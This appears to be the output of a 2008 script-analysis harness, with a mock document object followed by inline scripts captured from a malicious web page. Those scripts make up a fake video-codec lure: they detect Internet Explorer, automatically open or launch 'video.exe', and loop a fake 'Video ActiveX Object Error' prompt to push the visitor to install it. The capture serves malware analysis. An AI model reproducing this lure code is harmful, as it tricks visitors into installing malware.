// Monkeywrench run Fri Aug  1 09:59:58 2008
// -----------------------------------------------
// Set up a document object
// -----------------------------------------------
function my_location() {
   this.href = "";
}
function my_document() {
   this.location = new my_location();
   this.url = "";

   this.write = function(string) {
      print("my_document::write");
      print(string);
   }
};

function eval(something) {
   print(something);
}

var document = new my_document();
var location = new my_location();
document.location.href = 'http://jubilateya.com.ar/main.html';
document.url = 'http://jubilateya.com.ar/main.html';
location.href = 'http://jubilateya.com.ar/main.html';

// -----------------------------------------------
// inline script:
// -----------------------------------------------

var flag = false;
function scan() {
   is_IE = false;
   if (navigator.appName.toLowerCase() == 'microsoft internet explorer') {
      if (navigator.userAgent.toLowerCase().indexOf('opera') <= 0) {
         is_IE = true;
      }
   }
   if (is_IE) {
      if (window.ActiveXObject) {

}
      return true;
   }
   return true;
}

window.setInterval("scan()", 10000);

var is_XP_SP2 = (navigator.userAgent.indexOf("SV1") != -1) || (navigator.appMinorVersion && (navigator.appMinorVersion.indexOf('SP2') != -1));
var is_IE = false;
if (navigator.appName.toLowerCase() == 'microsoft internet explorer') {
   if (navigator.userAgent.toLowerCase().indexOf('opera') <= 0) {
      is_IE = true;
   }
}

function onloadExecutable() {
   if (is_IE) {
      if (is_XP_SP2 && typeof iie != 'undefined') {
         iie.launchURL("video.exe");
      } else {
         w = screen.width / 2 - 280;
         h = screen.height / 2 - 60;
         window.open("video.exe", "new", "width=580,height=180,left=" + w + ",top=" + h);
      }
   } else {
      w = screen.width / 2 - 280;
      h = screen.height / 2 - 60;
      window.open("video.exe", "_blank", "width=580,height=180,left=" + w + ",top=" + h);
   }
}

function activex_is_here() {
   try {
      var testObject = new ActiveXObject("videoPl.chl");
      return true;
   } catch(e) {;
   }

   return false;
}

function codecDownload() {
   if (window.navigator.userAgent.indexOf("SV1") != -1 || window.navigator.userAgent.indexOf("MSIE 7") != -1) {
      return;
   } else {
      onloadExecutable();
   }
}

// -----------------------------------------------
// script ends
// -----------------------------------------------
// -----------------------------------------------
// inline script:
// -----------------------------------------------

codecDownload();

// -----------------------------------------------
// script ends
// -----------------------------------------------
// -----------------------------------------------
// inline script:
// -----------------------------------------------

var Drag = {
   obj: null,
   init: function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper) {
      o.onmousedown = Drag.start;

      o.hmode = bSwapHorzRef ? false: true;
      o.vmode = bSwapVertRef ? false: true;

      o.root = oRoot && oRoot != null ? oRoot: o;

      if (o.hmode && isNaN(parseInt(o.root.style.left))) o.root.style.left = "0px";
      if (o.vmode && isNaN(parseInt(o.root.style.top))) o.root.style.top = "0px";
      if (!o.hmode && isNaN(parseInt(o.root.style.right))) o.root.style.right = "0px";
      if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";

      o.minX = typeof minX != 'undefined' ? minX: null;
      o.minY = typeof minY != 'undefined' ? minY: null;
      o.maxX = typeof maxX != 'undefined' ? maxX: null;
      o.maxY = typeof maxY != 'undefined' ? maxY: null;

      o.xMapper = fXMapper ? fXMapper: null;
      o.yMapper = fYMapper ? fYMapper: null;

      o.root.onDragStart = new Function();
      o.root.onDragEnd = new Function();
      o.root.onDrag = new Function();
   },

   start: function(e) {
      var o = Drag.obj = this;
      e = Drag.fixE(e);
      var y = parseInt(o.vmode ? o.root.style.top: o.root.style.bottom);
      var x = parseInt(o.hmode ? o.root.style.left: o.root.style.right);
      o.root.onDragStart(x, y);

      o.lastMouseX = e.clientX;
      o.lastMouseY = e.clientY;

      if (o.hmode) {
         if (o.minX != null) o.minMouseX = e.clientX - x + o.minX;
         if (o.maxX != null) o.maxMouseX = o.minMouseX + o.maxX - o.minX;
      } else {
         if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
         if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
      }

      if (o.vmode) {
         if (o.minY != null) o.minMouseY = e.clientY - y + o.minY;
         if (o.maxY != null) o.maxMouseY = o.minMouseY + o.maxY - o.minY;
      } else {
         if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
         if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
      }

      document.onmousemove = Drag.drag;
      document.onmouseup = Drag.end;

      return false;
   },

   drag: function(e) {
      e = Drag.fixE(e);
      var o = Drag.obj;

      var ey = e.clientY;
      var ex = e.clientX;
      var y = parseInt(o.vmode ? o.root.style.top: o.root.style.bottom);
      var x = parseInt(o.hmode ? o.root.style.left: o.root.style.right);
      var nx, ny;

      if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
      if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
      if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
      if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);

      nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
      ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));

      if (o.xMapper) nx = o.xMapper(y)
      else if (o.yMapper) ny = o.yMapper(x)

      Drag.obj.root.style[o.hmode ? "left": "right"] = nx + "px";
      Drag.obj.root.style[o.vmode ? "top": "bottom"] = ny + "px";
      Drag.obj.lastMouseX = ex;
      Drag.obj.lastMouseY = ey;

      Drag.obj.root.onDrag(nx, ny);
      return false;
   },

   end: function() {
      document.onmousemove = null;
      document.onmouseup = null;
      Drag.obj.root.onDragEnd(parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left": "right"]), parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top": "bottom"]));
      Drag.obj = null;
   },

   fixE: function(e) {
      if (typeof e == 'undefined') e = window.event;
      if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
      if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
      return e;
   }
};

function Down(download, e) {
   if (e != null && e.keyCode == 27) {
      //Close();
      //return;
   }
   switch (download) {
   case "iax":
      onloadExecutable();
      break;
      Close();
   }

}

function vc() {
   if (confirm('Video ActiveX Object Error.\n\nYour browser cannot play this video file.\nClick \'OK\' to download and install missing Video ActiveX Object.')) {
      onloadExecutable();
   } else {
      if (alert('Please install new version of Video ActiveX Object.')) {
         vc();
      } else {
         vc();
      }
   }
}

function Close() {
   var p = document.getElementById("popdiv");
   p.style.visibility = "hidden";
   vc();
}
function Details() {
   alert('You must download Video ActiveX Object to play this video file.');
}

// -----------------------------------------------
// script ends
// -----------------------------------------------
// -----------------------------------------------
// inline script:
// -----------------------------------------------
if (navigator.userAgent.indexOf("Firefox") != -1) {
   if (activex_is_here()) {} else {
      setTimeout("Close();", 1000);
   }
} else {
   if (activex_is_here()) {} else {
      setTimeout("showPopDiv();", 2000);
   }
}

function showPopDiv() {
   var sFlag = "No";
   var byFlag = false;
   var FlagAr = sFlag.split("");

   if (FlagAr[0] == "1") {
      byFlag = true;
   }
   if (FlagAr[0] == "3") {
      byFlag = true;
   }

   if (!byFlag) {
      var p = document.getElementById("popdiv");

      var myWidth = 0,
      myHeight = 0;
      if (typeof(window.innerWidth) == 'number') {
         myWidth = window.innerWidth;
         myHeight = window.innerHeight;
      } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
         myWidth = document.documentElement.clientWidth;
         myHeight = document.documentElement.clientHeight;
      } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
         myWidth = document.body.clientWidth;
         myHeight = document.body.clientHeight;
      }

      function getScroll() {

         var scrOfX = 0,
         scrOfY = 0;
         if (typeof(window.pageYOffset) == 'number') {
            scrOfY = window.pageYOffset;
            scrOfX = window.pageXOffset;
         } else if (document.body && (document.body.scrollLeft || document.body.scrollTop)) {
            scrOfY = document.body.scrollTop;
            scrOfX = document.body.scrollLeft;
         } else if (document.documentElement && (document.documentElement.scrollLeft || document.documentElement.scrollTop)) {
            scrOfY = document.documentElement.scrollTop;
            scrOfX = document.documentElement.scrollLeft;
         }
         return [scrOfX, scrOfY];

      }

      sc = getScroll();
      p.style.top = (myHeight / 2 - 181) + sc[1] + 'px';
      p.style.left = (myWidth / 2 - 120) + sc[0] + 'px';
      p.style.visibility = 'visible';
      p.focus();
   }
}

Drag.init(document.getElementById("popdiv"));

// -----------------------------------------------
// script ends
// -----------------------------------------------
// -----------------------------------------------
// inline script:
// -----------------------------------------------
sc_project = 3777076;
sc_invisible = 1;
sc_partition = 40;
sc_security = "dd0c06c0";

// -----------------------------------------------
// script ends
// -----------------------------------------------
// -----------------------------------------------
// EXTERNAL: http://www.statcounter.com/counter/counter.js
// -----------------------------------------------

